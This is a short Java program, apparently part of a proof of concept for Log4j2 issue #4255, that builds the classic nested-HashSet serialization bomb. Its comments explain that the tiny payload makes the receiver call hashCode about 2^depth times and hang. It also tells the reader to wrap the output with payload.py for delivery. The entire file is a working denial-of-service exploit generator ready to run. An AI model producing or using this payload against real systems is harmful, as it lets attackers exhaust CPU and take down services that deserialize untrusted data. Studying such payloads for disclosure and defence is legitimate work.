import java.io.*;
import java.util.HashSet;
import java.util.Set;

/**
 * CPU-DoS inner graph for Log4j2 #4255 — the classic "SerialDOS" nested-HashSet
 * bomb (Wouter Coekaerts, 2015). Writes a raw serialized object stream to stdout;
 * feed it to `payload.py wrap -` to put it inside the MarshalledObject envelope.
 *
 * Each level holds two sets, and both are shared into the next level, so the
 * graph is tiny (~2*depth sets, a few KB) but HashSet.readObject() must call
 * hashCode() ~2^depth times to reinsert them. At depth 100 that is 2^100
 * operations — the receiver thread pins a core and never returns. There is no
 * maxdepth or work limit on FOIS's inner stream to stop it.
 *
 *   javac PayloadGen.java && java PayloadGen [depth] > bomb.bin
 */
public class PayloadGen {
    public static void main(String[] args) throws Exception {
        int depth = args.length > 0 ? Integer.parseInt(args[0]) : 100;
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root, s2 = new HashSet<>();
        for (int i = 0; i < depth; i++) {
            Set<Object> t1 = new HashSet<>(), t2 = new HashSet<>();
            t1.add("foo");           // make t1 and t2 unequal so both survive in the set
            s1.add(t1); s1.add(t2);
            s2.add(t1); s2.add(t2);
            s1 = t1; s2 = t2;
        }
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        new ObjectOutputStream(bos).writeObject(root);
        System.out.write(bos.toByteArray());
        System.out.flush();
        System.err.println("[gen] nested-HashSet bomb depth=" + depth + " -> " + bos.size() + " bytes");
    }
}
